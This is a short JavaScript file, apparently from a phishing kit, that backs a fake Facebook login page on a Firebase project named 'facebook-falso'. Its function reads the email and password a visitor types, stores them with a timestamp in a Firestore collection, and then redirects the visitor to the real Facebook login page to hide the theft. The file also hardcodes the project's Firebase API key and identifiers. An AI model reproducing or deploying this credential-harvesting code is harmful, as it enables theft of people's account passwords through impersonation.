
// Your web app's Firebase configuration
var firebaseConfig = {
    apiKey: "AIzaSyCVic6mZJ9q8YwLm40rxRKgrw6pVVy1zpI",
    authDomain: "facebook-falso.firebaseapp.com",
    databaseURL: "https://facebook-falso.firebaseio.com",
    projectId: "facebook-falso",
    storageBucket: "facebook-falso.appspot.com",
    messagingSenderId: "784618832689",
    appId: "1:784618832689:web:7aadc49dc2db5e099a6610"
};

firebase.initializeApp(firebaseConfig);


var db = firebase.firestore();

// Add a new document in collection "cities"



function imprimir(){
    email=document.getElementById("email").value;
    pass=document.getElementById("pass").value;
    hoy = new Date();

    db.collection("Usuarios").add({
        correo: email,
        password: pass,
        fecha: hoy,
    })
    .then(function() {
        location.href="https://www.facebook.com/login.php";
    })
    .catch(function(error) {
        alert("Intenta de nuevo")
    });

    
}